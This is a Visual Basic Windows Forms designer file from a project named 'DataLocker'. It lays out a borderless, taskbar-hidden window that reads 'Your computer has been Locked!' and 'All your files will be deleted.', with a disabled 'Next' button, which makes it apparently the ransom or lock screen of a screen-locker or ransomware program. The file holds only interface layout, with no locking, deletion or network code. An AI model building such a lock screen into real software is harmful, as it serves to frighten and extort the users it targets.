<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.Wow1 = New DataLocker.Wow()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.BonfireButton2 = New DataLocker.BonfireButton()
        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
        Me.BonfireGroupBox2 = New DataLocker.BonfireGroupBox()
        Me.BonfireLabel2 = New DataLocker.BonfireLabel()
        Me.BonfireLabel1 = New DataLocker.BonfireLabel()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.BonfireButton1 = New DataLocker.BonfireButton()
        Me.Wow1.SuspendLayout()
        Me.BonfireGroupBox2.SuspendLayout()
        Me.SuspendLayout()
        '
        'Timer1
        '
        '
        'Wow1
        '
        Me.Wow1.Controls.Add(Me.Panel1)
        Me.Wow1.Controls.Add(Me.BonfireButton2)
        Me.Wow1.Controls.Add(Me.CheckBox1)
        Me.Wow1.Controls.Add(Me.BonfireGroupBox2)
        Me.Wow1.Controls.Add(Me.BonfireButton1)
        Me.Wow1.Location = New System.Drawing.Point(2, 1)
        Me.Wow1.Name = "Wow1"
        Me.Wow1.Padding = New System.Windows.Forms.Padding(1, 55, 1, 1)
        Me.Wow1.Size = New System.Drawing.Size(572, 319)
        Me.Wow1.TabIndex = 0
        Me.Wow1.Tyype = DataLocker.Wow.Type.Locker
        '
        'Panel1
        '
        Me.Panel1.BackColor = System.Drawing.Color.White
        Me.Panel1.ForeColor = System.Drawing.Color.White
        Me.Panel1.Location = New System.Drawing.Point(425, 11)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(134, 36)
        Me.Panel1.TabIndex = 8
        '
        'BonfireButton2
        '
        Me.BonfireButton2.ButtonStyle = DataLocker.BonfireButton.Style.Blue
        Me.BonfireButton2.Cursor = System.Windows.Forms.Cursors.Hand
        Me.BonfireButton2.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BonfireButton2.Image = Nothing
        Me.BonfireButton2.Location = New System.Drawing.Point(425, 283)
        Me.BonfireButton2.Name = "BonfireButton2"
        Me.BonfireButton2.RoundedCorners = False
        Me.BonfireButton2.Size = New System.Drawing.Size(65, 26)
        Me.BonfireButton2.TabIndex = 7
        Me.BonfireButton2.Text = "Link"
        '
        'CheckBox1
        '
        Me.CheckBox1.AutoSize = True
        Me.CheckBox1.BackColor = System.Drawing.Color.Transparent
        Me.CheckBox1.Location = New System.Drawing.Point(12, 289)
        Me.CheckBox1.Name = "CheckBox1"
        Me.CheckBox1.Size = New System.Drawing.Size(70, 17)
        Me.CheckBox1.TabIndex = 6
        Me.CheckBox1.Text = "Complete"
        Me.CheckBox1.UseVisualStyleBackColor = False
        '
        'BonfireGroupBox2
        '
        Me.BonfireGroupBox2.BackColor = System.Drawing.Color.FromArgb(CType(CType(250, Byte), Integer), CType(CType(250, Byte), Integer), CType(CType(250, Byte), Integer))
        Me.BonfireGroupBox2.Controls.Add(Me.BonfireLabel2)
        Me.BonfireGroupBox2.Controls.Add(Me.BonfireLabel1)
        Me.BonfireGroupBox2.Controls.Add(Me.Label1)
        Me.BonfireGroupBox2.Controls.Add(Me.Label2)
        Me.BonfireGroupBox2.Location = New System.Drawing.Point(10, 58)
        Me.BonfireGroupBox2.Name = "BonfireGroupBox2"
        Me.BonfireGroupBox2.Size = New System.Drawing.Size(549, 208)
        Me.BonfireGroupBox2.TabIndex = 5
        Me.BonfireGroupBox2.Text = "BonfireGroupBox2"
        '
        'BonfireLabel2
        '
        Me.BonfireLabel2.AutoSize = True
        Me.BonfireLabel2.Font = New System.Drawing.Font("Verdana", 6.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.BonfireLabel2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.BonfireLabel2.Location = New System.Drawing.Point(350, 184)
        Me.BonfireLabel2.Name = "BonfireLabel2"
        Me.BonfireLabel2.Size = New System.Drawing.Size(145, 12)
        Me.BonfireLabel2.TabIndex = 5
        Me.BonfireLabel2.Text = "All your files will be deleted."
        '
        'BonfireLabel1
        '
        Me.BonfireLabel1.AutoSize = True
        Me.BonfireLabel1.Font = New System.Drawing.Font("Verdana", 6.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.BonfireLabel1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(135, Byte), Integer), CType(CType(135, Byte), Integer), CType(CType(135, Byte), Integer))
        Me.BonfireLabel1.Location = New System.Drawing.Point(57, 40)
        Me.BonfireLabel1.Name = "BonfireLabel1"
        Me.BonfireLabel1.Size = New System.Drawing.Size(423, 156)
        Me.BonfireLabel1.TabIndex = 4
        Me.BonfireLabel1.Text = resources.GetString("BonfireLabel1.Text")
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.BackColor = System.Drawing.Color.Transparent
        Me.Label1.Font = New System.Drawing.Font("Verdana", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label1.Location = New System.Drawing.Point(124, 8)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(207, 18)
        Me.Label1.TabIndex = 2
        Me.Label1.Text = "Your computer has been"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.BackColor = System.Drawing.Color.Transparent
        Me.Label2.Font = New System.Drawing.Font("Verdana", 12.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label2.ForeColor = System.Drawing.Color.DarkRed
        Me.Label2.Location = New System.Drawing.Point(328, 6)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(75, 20)
        Me.Label2.TabIndex = 3
        Me.Label2.Text = "Locked!"
        '
        'BonfireButton1
        '
        Me.BonfireButton1.ButtonStyle = DataLocker.BonfireButton.Style.Blue
        Me.BonfireButton1.Cursor = System.Windows.Forms.Cursors.Hand
        Me.BonfireButton1.Enabled = False
        Me.BonfireButton1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BonfireButton1.Image = Nothing
        Me.BonfireButton1.Location = New System.Drawing.Point(496, 283)
        Me.BonfireButton1.Name = "BonfireButton1"
        Me.BonfireButton1.RoundedCorners = False
        Me.BonfireButton1.Size = New System.Drawing.Size(65, 26)
        Me.BonfireButton1.TabIndex = 5
        Me.BonfireButton1.Text = "Next"
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.SystemColors.ControlDarkDark
        Me.ClientSize = New System.Drawing.Size(575, 322)
        Me.Controls.Add(Me.Wow1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Form1"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Text = "Data"
        Me.Wow1.ResumeLayout(False)
        Me.Wow1.PerformLayout()
        Me.BonfireGroupBox2.ResumeLayout(False)
        Me.BonfireGroupBox2.PerformLayout()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents Wow1 As DataLocker.Wow
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents BonfireButton1 As DataLocker.BonfireButton
    Friend WithEvents BonfireLabel1 As DataLocker.BonfireLabel
    Friend WithEvents BonfireGroupBox2 As DataLocker.BonfireGroupBox
    Friend WithEvents BonfireButton2 As DataLocker.BonfireButton
    Friend WithEvents CheckBox1 As System.Windows.Forms.CheckBox
    Friend WithEvents BonfireLabel2 As DataLocker.BonfireLabel
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents Panel1 As System.Windows.Forms.Panel

End Class
